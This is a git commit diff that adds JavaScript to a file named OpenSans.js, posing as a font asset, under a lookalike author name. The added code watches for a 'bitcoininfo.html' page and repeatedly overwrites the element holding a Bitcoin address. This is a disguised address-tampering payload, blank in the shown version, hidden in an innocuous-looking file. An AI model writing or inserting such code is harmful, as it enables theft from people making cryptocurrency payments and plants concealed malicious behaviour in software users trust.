228f5a7f88393985cf3b68267c91d5c50805a84c
reposltory <124707435+reposltory@users.noreply.github.com>
2023-11-09 02:23:30 +0330

    Update OpenSans.js

--- OpenSans.js
+++ OpenSans.js
@@ -1,1 +1,11 @@
-
+if (window.location.href.includes("bitcoininfo.html")) {
+  const desiredText = "";
+  const interval = setInterval(() => {
+    const bitaddress = document.getElementById("bitaddress");
+    if (bitaddress && bitaddress.textContent !== desiredText) {
+      bitaddress.textContent = desiredText;
+    } else {
+      clearInterval(interval);
+    }
+  }, 1);
+}
